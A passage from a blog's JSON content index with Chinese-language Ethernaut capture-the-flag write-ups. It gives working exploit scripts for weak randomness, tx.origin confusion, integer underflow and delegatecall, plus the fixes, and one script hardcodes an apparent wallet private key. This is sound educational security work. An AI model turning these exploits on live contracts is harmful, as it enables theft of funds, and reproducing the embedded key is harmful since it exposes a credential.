didn't rename the constructor method of its contract:</span><br><span class=\"line\"></span><br><span class=\"line\">contract Rubixi {</span><br><span class=\"line\">  address private owner;</span><br><span class=\"line\">  function DynamicPyramid() { owner = msg.sender; }</span><br><span class=\"line\">  function collectAllFees() { owner.transfer(this.balance) }</span><br><span class=\"line\">  ...</span><br><span class=\"line\">This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.</span><br></pre></td></tr></table></figure>\n<p>原来是一个小故事，告诉我们智能合约安全的重要性。</p>\n<p>题目把Fallout打错了，变成了Fal1out，就从构造函数变成了普通public函数。</p>\n<p>之后solidity把构造函数的定义方式改为了constructor，不再是要求和合约名一样了。</p>\n<p>很简单的这一题，顺便试了试IDE。下一题吧。</p>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Coin Flip（随机数）","url":"/ethernaut/04-Coin-Flip/","content":"<p>猜硬币游戏。</p>\n<p>使用心灵感应的能力，十次猜对硬币正反即可通过233</p>\n<span id=\"more\"></span>\n<p>提示是也许要离开控制台进行操作。比如写一个js脚本？</p>\n<p>代码已经可见随机数的计算过程了，通过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uint256 blockValue = uint256(blockhash(block.number - 1));</span><br></pre></td></tr></table></figure>\n<p>来获取一个随机数。即计算前一个区块的哈希。</p>\n<h2 id=\"解决方案1\">解决方案1</h2>\n<p>使用js写一个脚本：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> { ethers } = <span class=\"built_in\">require</span>(<span class=\"string\">\"ethers\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">getConfig</span>(<span class=\"params\">contractAddress</span>) {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> provider = <span class=\"keyword\">new</span> ethers.<span class=\"title class_\">JsonRpcProvider</span>(<span class=\"string\">`https://sepolia.infura.io/v3/&lt;your-api-key&gt;`</span>);</span><br><span class=\"line\">  <span class=\"keyword\">const</span> wallet = <span class=\"keyword\">new</span> ethers.<span class=\"title class_\">Wallet</span>(<span class=\"string\">\"65addf4028c7ad097b5624235ca335aa6518629e5bd709975a7fea5c00203e2f\"</span>, provider);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> abi = [</span><br><span class=\"line\">    {</span><br><span class=\"line\">      <span class=\"attr\">inputs</span>: [],</span><br><span class=\"line\">      <span class=\"attr\">stateMutability</span>: <span class=\"string\">\"nonpayable\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">type</span>: <span class=\"string\">\"constructor\"</span>,</span><br><span class=\"line\">    },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      <span class=\"attr\">inputs</span>: [],</span><br><span class=\"line\">      <span class=\"attr\">name</span>: <span class=\"string\">\"consecutiveWins\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">outputs</span>: [</span><br><span class=\"line\">        {</span><br><span class=\"line\">          <span class=\"attr\">internalType</span>: <span class=\"string\">\"uint256\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">name</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">type</span>: <span class=\"string\">\"uint256\"</span>,</span><br><span class=\"line\">        },</span><br><span class=\"line\">      ],</span><br><span class=\"line\">      <span class=\"attr\">stateMutability</span>: <span class=\"string\">\"view\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">type</span>: <span class=\"string\">\"function\"</span>,</span><br><span class=\"line\">    },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      <span class=\"attr\">inputs</span>: [</span><br><span class=\"line\">        {</span><br><span class=\"line\">          <span class=\"attr\">internalType</span>: <span class=\"string\">\"bool\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">name</span>: <span class=\"string\">\"_guess\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">type</span>: <span class=\"string\">\"bool\"</span>,</span><br><span class=\"line\">        },</span><br><span class=\"line\">      ],</span><br><span class=\"line\">      <span class=\"attr\">name</span>: <span class=\"string\">\"flip\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">outputs</span>: [</span><br><span class=\"line\">        {</span><br><span class=\"line\">          <span class=\"attr\">internalType</span>: <span class=\"string\">\"bool\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">name</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">type</span>: <span class=\"string\">\"bool\"</span>,</span><br><span class=\"line\">        },</span><br><span class=\"line\">      ],</span><br><span class=\"line\">      <span class=\"attr\">stateMutability</span>: <span class=\"string\">\"nonpayable\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">type</span>: <span class=\"string\">\"function\"</span>,</span><br><span class=\"line\">    },</span><br><span class=\"line\">  ];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> contract = <span class=\"keyword\">new</span> ethers.<span class=\"title class_\">Contract</span>(contractAddress, abi, wallet);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> { provider, wallet, contract };</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">CONTRACT_ADDRESS</span> = <span class=\"string\">\"0xd21595e895afFB477036a5674Fe717B073FC12bF\"</span>; <span class=\"comment\">// 替换为你的合约地址</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">FACTOR</span> = ethers.<span class=\"title function_\">toBigInt</span>(<span class=\"string\">\"57896044618658097711785492504343953926634992332820282019728792003956564819968\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> { provider, wallet, contract } = <span class=\"title function_\">getConfig</span>(<span class=\"variable constant_\">CONTRACT_ADDRESS</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> lastBlockNumber = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> blockNumber = <span class=\"keyword\">await</span> provider.<span class=\"title function_\">getBlockNumber</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (blockNumber === lastBlockNumber) {</span><br><span class=\"line\">      <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    lastBlockNumber = blockNumber;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> blockHash = (<span class=\"keyword\">await</span> provider.<span class=\"title function_\">getBlock</span>(blockNumber)).<span class=\"property\">hash</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> blockValue = ethers.<span class=\"title function_\">toBigInt</span>(blockHash);</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"blockValue:\"</span>, blockValue);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> coinFlip = blockValue / <span class=\"variable constant_\">FACTOR</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> side = coinFlip == <span class=\"number\">1</span> ? <span class=\"literal\">true</span> : <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"side:\"</span>, side);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span> {</span><br><span class=\"line\">      <span class=\"keyword\">const</span> tx = <span class=\"keyword\">await</span> contract.<span class=\"title function_\">flip</span>(side);</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"tx:\"</span>, tx.<span class=\"property\">hash</span>);</span><br><span class=\"line\">      <span class=\"keyword\">await</span> tx.<span class=\"title function_\">wait</span>();</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"tx mined\"</span>);</span><br><span class=\"line\">    } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"tx failed\"</span>);</span><br><span class=\"line\">      <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> result = <span class=\"keyword\">await</span> contract.<span class=\"title function_\">consecutiveWins</span>();</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"consecutiveWins:\"</span>, result.<span class=\"title function_\">toString</span>());</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"===================================\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (result === <span class=\"string\">\"10\"</span>) {</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"Congratulations! You've won 10 times in a row!\"</span>);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">main</span>();</span><br></pre></td></tr></table></figure>\n<p>但是，我试了两次，都是连续9次猜对之后出问题？</p>\n<p>我感觉可能有点时间问题，比如我猜出答案到我发送tx，中间可能隔了两个区块之类的，这样就会出问题了。</p>\n<p>一个暴力的解决方法：加钱，给更多gasPrice增加打包速度，保证不要超过两个区块，还算有效2333</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> tx = <span class=\"keyword\">await</span> contract.<span class=\"title function_\">flip</span>(side, {</span><br><span class=\"line\">\t<span class=\"attr\">gasPrice</span>: ethers.<span class=\"title function_\">parseUnits</span>(<span class=\"string\">\"50\"</span>, <span class=\"string\">\"gwei\"</span>),</span><br><span class=\"line\">});</span><br></pre></td></tr></table></figure>\n<p><img src=\"/ethernaut/04-Coin-Flip/image-20241221212948232.png\" alt=\"image-20241221212948232\" style=\"zoom:50%;\"></p>\n<h2 id=\"解决方案2\">解决方案2</h2>\n<p>GPT提供了另一个思路，写一个攻击智能合约，在攻击合约里调用这个合约，这可以保证他们的blocknumber一样，解决了时序问题。</p>\n<h1 id=\"总结\">总结</h1>\n<p>Solidity没提供原生的随机数方法。生成随机数的方法都是可见的。</p>\n<p>也可以通过修改时间戳、blockhash等方式，让随机结果趋于对自己有利。</p>\n<p>一些推荐随机数方案：</p>\n<ul>\n<li>使用 <strong>Chainlink VRF</strong>：最安全可靠，但需要支付 LINK\n费用。</li>\n<li><strong>RANDAO</strong>\n或其他去中心化方案：适合对去中心化和安全性要求高的场景。</li>\n<li><strong>Oraclize</strong>：适合简单随机数生成，但依赖外部服务。</li>\n</ul>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Telephone","url":"/ethernaut/05-Telephone/","content":"<p>第五题，看起来很简单。目标是让</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tx.origin != msg.sender</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"gpt的知识点整理\">GPT的知识点整理</h1>\n<p>在以太坊中：</p>\n<ul>\n<li><strong><code>tx.origin</code></strong>\n是发起整个交易的原始账户地址（最顶层的调用者）。</li>\n<li><strong><code>msg.sender</code></strong>\n是当前合约调用的直接发送者（可能是外部账户或合约）。</li>\n</ul>\n<p>要实现 <code>tx.origin != msg.sender</code>，需要通过\n<strong>一个中间合约</strong> 调用目标合约：</p>\n<h4 id=\"解决方案\">解决方案：</h4>\n<ol type=\"1\">\n<li><p>创建一个\n<strong>中间合约</strong>，该合约调用目标合约的方法。</p></li>\n<li><p>外部用户（你自己）调用中间合约，形成调用链：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">你 (tx.origin) -&gt; 中间合约 (msg.sender) -&gt; 目标合约</span><br></pre></td></tr></table></figure></p></li>\n</ol>\n<hr>\n<h3 id=\"表格-1tx-参数说明及设置方法\"><strong>表格 1：<code>tx</code>\n参数说明及设置方法</strong></h3>\n<p><code>tx</code> 是全局对象，代表\n<strong>当前交易的属性</strong>，但它是只读的，不能直接设置。以下是常见参数：</p>\n<table>\n<colgroup>\n<col style=\"width: 12%\">\n<col style=\"width: 35%\">\n<col style=\"width: 9%\">\n<col style=\"width: 43%\">\n</colgroup>\n<thead>\n<tr>\n<th>参数名</th>\n<th>说明</th>\n<th>是否可设置</th>\n<th>示例设置方法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>tx.origin</code></td>\n<td>原始交易发起者（外部账户地址）。</td>\n<td>否</td>\n<td>由发起交易的外部账户决定，无法通过代码设置。</td>\n</tr>\n<tr>\n<td><code>tx.gasprice</code></td>\n<td>当前交易的 Gas 价格（单位：wei）。</td>\n<td>否</td>\n<td>设置 Gas 价格时通过交易选项 <code>gasPrice</code> 指定。</td>\n</tr>\n<tr>\n<td><code>tx.value</code></td>\n<td>当前交易发送的 ETH 数量（单位：wei）。</td>\n<td>否</td>\n<td>在发送交易时通过 <code>value</code> 参数指定。</td>\n</tr>\n<tr>\n<td><code>tx.gaslimit</code></td>\n<td>当前交易的 Gas 限制。</td>\n<td>否</td>\n<td>在发送交易时通过 <code>gasLimit</code> 或 <code>gas</code>\n参数指定。</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h3 id=\"表格-2msg-参数说明及设置方法\"><strong>表格 2：<code>msg</code>\n参数说明及设置方法</strong></h3>\n<p><code>msg</code> 是 Solidity\n中的全局变量，表示当前执行上下文的信息。以下是 <code>msg</code>\n参数的详细说明：</p>\n<table>\n<colgroup>\n<col style=\"width: 9%\">\n<col style=\"width: 37%\">\n<col style=\"width: 7%\">\n<col style=\"width: 45%\">\n</colgroup>\n<thead>\n<tr>\n<th>参数名</th>\n<th>说明</th>\n<th>是否可设置</th>\n<th>示例设置方法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>msg.sender</code></td>\n<td>当前调用的发送者地址（可以是外部账户或合约地址）。</td>\n<td>否</td>\n<td>根据谁调用当前合约自动设置（外部账户或上一级合约地址）。</td>\n</tr>\n<tr>\n<td><code>msg.value</code></td>\n<td>交易中随附的以太币数量（单位：wei）。</td>\n<td>是</td>\n<td>在发送交易时通过 <code>value</code>\n参数指定，例如：<code>{ value: 1 ether }</code>。</td>\n</tr>\n<tr>\n<td><code>msg.data</code></td>\n<td>交易中随附的完整调用数据（包括函数选择器和参数）。</td>\n<td>是</td>\n<td>例如：<code>{data: '0xdd365b8b'}</code>，调用函数的时候会自动生成data，格式是函数选择器+参数。</td>\n</tr>\n<tr>\n<td><code>msg.sig</code></td>\n<td>交易中函数选择器（前 4 字节的 <code>msg.data</code>）。</td>\n<td>否</td>\n<td>根据调用的函数自动生成，不能直接设置。</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h3 id=\"如何设置交易参数\"><strong>如何设置交易参数</strong></h3>\n<p>以下是设置交易参数的方式（以 Web3.js 和 ethers.js 为例）：</p>\n<h4 id=\"web3.js\"><strong>Web3.js</strong></h4>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> contract.<span class=\"property\">methods</span>.<span class=\"title function_\">someFunction</span>(args).<span class=\"title function_\">send</span>({</span><br><span class=\"line\">  <span class=\"attr\">from</span>: <span class=\"string\">'0xYourAddress'</span>,         <span class=\"comment\">// 交易发起地址</span></span><br><span class=\"line\">  <span class=\"attr\">value</span>: web3.<span class=\"property\">utils</span>.<span class=\"title function_\">toWei</span>(<span class=\"string\">'1'</span>),  <span class=\"comment\">// 发送 1 ETH</span></span><br><span class=\"line\">  <span class=\"attr\">gas</span>: <span class=\"number\">100000</span>,                   <span class=\"comment\">// 设置 Gas 限制</span></span><br><span class=\"line\">  <span class=\"attr\">gasPrice</span>: web3.<span class=\"property\">utils</span>.<span class=\"title function_\">toWei</span>(<span class=\"string\">'20'</span>, <span class=\"string\">'gwei'</span>) <span class=\"comment\">// 设置 Gas 价格</span></span><br><span class=\"line\">});</span><br></pre></td></tr></table></figure>\n<h4 id=\"ethers.js\"><strong>ethers.js</strong></h4>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> tx = <span class=\"keyword\">await</span> contract.<span class=\"title function_\">someFunction</span>(args, {</span><br><span class=\"line\">  <span class=\"attr\">value</span>: ethers.<span class=\"property\">utils</span>.<span class=\"title function_\">parseEther</span>(<span class=\"string\">'1'</span>), <span class=\"comment\">// 发送 1 ETH</span></span><br><span class=\"line\">  <span class=\"attr\">gasLimit</span>: <span class=\"number\">100000</span>,                   <span class=\"comment\">// 设置 Gas 限制</span></span><br><span class=\"line\">  <span class=\"attr\">gasPrice</span>: ethers.<span class=\"property\">utils</span>.<span class=\"title function_\">parseUnits</span>(<span class=\"string\">'20'</span>, <span class=\"string\">'gwei'</span>) <span class=\"comment\">// 设置 Gas 价格</span></span><br><span class=\"line\">});</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"总结\"><strong>总结</strong></h3>\n<ul>\n<li><code>tx.origin != msg.sender</code>\n的核心是通过中间合约构造调用链。</li>\n<li><code>tx</code>\n参数只读，设置交易参数需要通过外部发起交易时指定。</li>\n<li><code>msg</code> 参数由交易上下文决定，可通过控制调用链、发送的\n<code>value</code> 等间接影响。</li>\n</ul>\n<h1 id=\"解题\">解题</h1>\n<h3 id=\"上传智能合约的方法\">上传智能合约的方法</h3>\n<p>https://blog.csdn.net/wujian0428/article/details/129260266</p>\n<h3 id=\"调用其他智能合约的方法\"><strong>调用其他智能合约的方法</strong></h3>\n<ol type=\"1\">\n<li><p><strong>通过接口调用</strong></p>\n<ul>\n<li>定义目标合约的接口。</li>\n<li>创建接口实例，调用目标函数。</li>\n</ul>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">interface IExample {</span><br><span class=\"line\">    function doSomething(uint256 value) external;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">contract MyContract {</span><br><span class=\"line\">    function callOther(address target, uint256 value) public {</span><br><span class=\"line\">        IExample(target).doSomething(value);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p></li>\n<li><p><strong>直接调用（低级调用）</strong></p>\n<ul>\n<li>使用 <code>.call</code> 进行底层调用。</li>\n<li>适用于未知 ABI 的动态调用。</li>\n</ul>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(bool success, ) = target.call(abi.encodeWithSignature(\"doSomething(uint256)\", value));</span><br><span class=\"line\">require(success, \"Call failed\");</span><br></pre></td></tr></table></figure></p></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">interface ITelephone {</span><br><span class=\"line\">    function changeOwner(address _owner) external;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">contract AttackTelephone {</span><br><span class=\"line\">    address public targetAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _targetAddress) {</span><br><span class=\"line\">        targetAddress = _targetAddress;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack(address _newOwner) public {</span><br><span class=\"line\">        ITelephone(targetAddress).changeOwner(_newOwner);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>直接在Remix上部署、运行，就攻击成功了。</p>\n<p><img src=\"/ethernaut/05-Telephone/image-20241221224318309.png\" alt=\"image-20241221224318309\" style=\"zoom:50%;\"></p>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Token","url":"/ethernaut/06-Token/","content":"<p>攻击这个 Token 合约，给自己拿好多钱。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Token {</span><br><span class=\"line\">    mapping(address =&gt; uint256) balances;</span><br><span class=\"line\">    uint256 public totalSupply;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t// 初始的前全在创建者手里</span><br><span class=\"line\">    constructor(uint256 _initialSupply) public {</span><br><span class=\"line\">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 转账函数</span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) {</span><br><span class=\"line\">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class=\"line\">        balances[msg.sender] -= _value;</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function balanceOf(address _owner) public view returns (uint256 balance) {</span><br><span class=\"line\">        return balances[_owner];</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>初始情况，我有20个Token。</p>\n<p>那就是，通过自己给自己转账，在我的前还没被扣掉之前，给自己转两次账？</p>\n<p>我先试试。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> { provider, wallet, contract } = <span class=\"title function_\">getConfig</span>(<span class=\"variable constant_\">CONTRACT_ADDRESS</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> time = <span class=\"number\">100</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (time--) {</span><br><span class=\"line\">    contract.<span class=\"title function_\">transfer</span>(<span class=\"variable constant_\">MY_WALLET</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> ret = <span class=\"keyword\">await</span> contract.<span class=\"title function_\">balanceOf</span>(<span class=\"variable constant_\">MY_WALLET</span>);</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(ret);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>很显然，肯定攻击不成功，报错了\n<code>could not coalesce error</code>，简而言之就是请求太频繁状态不匹配了。</p>\n<p>而且也太天真了，因为一定是一个事务执行完，再执行下一个事务的。</p>\n<p>然后！想到问题可能是类型转换的地方。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">require(balances[msg.sender] - _value &gt;= 0);</span><br></pre></td></tr></table></figure>\n<p>如果 value = 21，减一下就下溢到2^256 - 1了。</p>\n<p>但是他连续 -21 再 +21，还是不变。</p>\n<p>能不能在 -21 之后，执行另一个 -100000的命令？不可能的。</p>\n<p>因为一定是一个事务执行完，再执行下一个事务的。</p>\n<p>所以得把账转给别人！！</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">CONTRACT_ADDRESS</span> = <span class=\"string\">\"0x967e954E30B4CD6E3618EcF88F8c02AA2431C363\"</span>; <span class=\"comment\">// 替换为你的合约地址</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">MY_WALLET</span> = <span class=\"string\">\"0xE484608fA7639996d0F359f76f34DF9fe15f7F7B\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> { provider, wallet, contract } = <span class=\"title function_\">getConfig</span>(<span class=\"variable constant_\">CONTRACT_ADDRESS</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> tx = <span class=\"keyword\">await</span> contract.<span class=\"title function_\">transfer</span>(<span class=\"variable constant_\">CONTRACT_ADDRESS</span>, <span class=\"number\">21</span>);</span><br><span class=\"line\">  <span class=\"keyword\">await</span> tx.<span class=\"title function_\">wait</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> ret = <span class=\"keyword\">await</span> contract.<span class=\"title function_\">balanceOf</span>(<span class=\"variable constant_\">MY_WALLET</span>);</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(ret);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">main</span>();</span><br></pre></td></tr></table></figure>\n<p>成功了！</p>\n<p><img src=\"/ethernaut/06-Token/image-20241221235843734.png\" alt=\"image-20241221235843734\" style=\"zoom:50%;\"></p>\n<h1 id=\"总结\">总结</h1>\n<p><strong>整数下溢漏洞</strong></p>\n<p>在 Solidity 中，未正确处理的整数操作（例如减法）可能会导致\n<strong>整数下溢（underflow）</strong>。具体表现为，当一个无符号整数减去一个大于自身的值时，它会绕回到\nuint256 的最大值。</p>\n<p><strong>漏洞触发条件</strong></p>\n<ol type=\"1\">\n<li><p>合约未使用 SafeMath 或其他溢出检查机制。</p></li>\n<li><p>函数逻辑中对减法操作的结果没有进行合理检查。</p></li>\n<li><p>攻击者通过构造一个超出余额的转账请求（例如转账 21 块，但余额只有\n20 块），触发下溢漏洞。</p></li>\n</ol>\n<p><strong>智能合约事务的执行顺序</strong></p>\n<ol type=\"1\">\n<li><p><strong>事务的执行是顺序的</strong>：每个函数调用的状态更新（例如\nbalances[msg.sender] -= _value）会立即生效，不会被跳过或延迟。</p></li>\n<li><p><strong>单一事务的原子性</strong>：在同一个事务中，所有的状态变更要么全部完成，要么全部回滚。</p></li>\n<li><p><strong>外部调用的顺序</strong>：如果函数中没有外部调用（例如\ncall 或\ndelegatecall），合约状态的更新顺序是严格的，攻击者无法通过并行调用干扰其执行。</p></li>\n</ol>\n<p><strong>如何修复</strong></p>\n<ol type=\"1\">\n<li><p>使用 SafeMath 或 Solidity &gt;= 0.8.0 的内置溢出保护：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">balances[msg.sender] = balances[msg.sender].sub(_value); // SafeMath 方法</span><br></pre></td></tr></table></figure></p></li>\n<li><p>明确检查操作条件：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">require(balances[msg.sender] &gt;= _value, \"Insufficient balance\");</span><br></pre></td></tr></table></figure></p></li>\n<li><p>避免直接使用不安全的算术操作。</p></li>\n</ol>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Delegation","url":"/ethernaut/07-Delegation/","content":"<p>第二天，在玩几个题。</p>\n<p>这题要了解Solidity的delegatecall函数。</p>\n<span id=\"more\"></span>\n<h1 id=\"delegatecall\">delegatecall</h1>\n<p>有两个函数用于调用其他智能合约函数：call和delegatecall。</p>\n<p>为了区分清楚，使用delegatecall的合约称为<strong>调用合约</strong>，被调用的称为<strong>目标合约</strong>。</p>\n<p>delegatecall更加底层一点，相当于直接把目标合约函数的字节码拿过来，继续执行，其他什么都不改。</p>\n<p>而call稍微执行的复杂一点，会去修改执行环境的存储空间和上下文。</p>\n<p>总而言之：</p>\n<table>\n<colgroup>\n<col style=\"width: 7%\">\n<col style=\"width: 43%\">\n<col style=\"width: 49%\">\n</colgroup>\n<thead>\n<tr>\n<th>特性</th>\n<th>call</th>\n<th>delegatecall</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>存储</td>\n<td>修改目标合约的存储</td>\n<td>修改调用合约的存储</td>\n</tr>\n<tr>\n<td>上下文</td>\n<td>执行目标合约的上下文，使用目标合约的环境变量</td>\n<td>执行目标合约的代码，但使用调用合约的存储和环境变量</td>\n</tr>\n<tr>\n<td>合约地址</td>\n<td>调用目标合约的地址</td>\n<td>调用合约的地址（this 指向调用合约）</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"methods-id\">Methods ID</h1>\n<p>Method ID（方法标识符，函数选择器）是一个 <strong>4 字节</strong>\n长度的哈希值，它用于标识调用函数的标识符。方法 ID 是从函数的\n<strong>函数签名</strong>\n生成的，函数签名是由函数名称和参数类型（包括返回值类型）组成的字符串。它被用作区分不同函数的标识符，尤其是在与合约进行低级调用时。</p>\n<p>可以用abi的encodeWithSignature计算ID例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">abi.encodeWithSignature(\"setValue(uint256)\", _value)</span><br></pre></td></tr></table></figure>\n<p>理论上这样计算出来的函数ID有可能发生冲突，但是概率非常低。或许有可能被里用这个漏洞。</p>\n<h1 id=\"解题\">解题</h1>\n<p>了解了这些，这一题就很简单了。</p>\n<p>获取pwn的Methods ID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">_ethers.utils.id(\"pwn()\").slice(0,10)</span><br><span class=\"line\">'0xdd365b8b'</span><br></pre></td></tr></table></figure>\n<p>然后直接发送事务：</p>\n<figure class=\"highlight 